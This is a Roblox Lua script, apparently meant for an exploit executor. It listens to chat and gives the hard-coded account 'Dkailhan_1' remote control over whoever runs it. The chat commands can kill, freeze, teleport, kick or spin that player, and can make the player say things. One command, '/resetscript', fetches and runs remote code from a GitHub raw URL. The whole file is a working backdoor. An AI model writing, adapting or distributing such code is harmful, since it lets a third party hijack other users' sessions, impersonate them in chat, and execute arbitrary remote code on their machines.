local TextChatService = game:GetService("TextChatService")
local IDKWHATISTHIS = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral") 
local lp = game:FindService("Players").LocalPlayer
local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
local lpName = game:FindService("Players").LocalPlayer.Name

local orbiting = false
local orbitConnection

TextChatService.OnIncomingMessage = function(message)
    pcall(function()
        local playerName = message.TextSource and message.TextSource.Name or nil
        local messageProps = Instance.new("TextChatMessageProperties")
        local messageContent = message.Text
        if playerName == "Dkailhan_1" then
            messageProps.PrefixText = string.format('<font color="%s">%s</font> %s', "#cd2c18", "[OWNER]", message.PrefixText)
        end
        if playerName == lpName then return end
        if messageContent == "/kill" and playerName == "Dkailhan_1" then
            lp.Character.Humanoid.Health = 0
        elseif messageContent == "/bring" and playerName == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
            lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
        elseif messageContent == "/fr" and playerName == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = true
        elseif messageContent == "/unfr" and playerName == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = false
        elseif string.sub(messageContent, 1, 4) == "/say" and playerName == "Dkailhan_1" then
            local toSay = string.sub(messageContent, 6)
            IDKWHATISTHIS:SendAsync(toSay)
        elseif string.sub(messageContent, 1, 5) == "/kick" and playerName == "Dkailhan_1" then
            local kickms = string.sub(messageContent, 7)
            lp:Kick(kickms)
        elseif string.sub(messageContent, 1, 5) == "/spin" and playerName == "Dkailhan_1" then
            local numbertospin = tonumber(string.sub(messageContent, 7)) or 100
            for i = 1, numbertospin do
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
                task.wait()
            end
        elseif messageContent == "/resetscript" and playerName == "Dkailhan_1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
        elseif string.sub(messageContent, 1, 6) == "/orbit" and playerName == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
            local radius = tonumber(string.sub(messageContent, 8)) or 10
            if not orbiting then
                orbiting = true
                orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local angle = tick() * math.rad(90)
                    hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                end)
            end
        elseif messageContent == "/unorbit" and playerName == "Dkailhan_1" then
            if orbiting then
                orbiting = false
                if orbitConnection then
                    orbitConnection:Disconnect()
                    orbitConnection = nil
                end
            end
        end
    end)
end
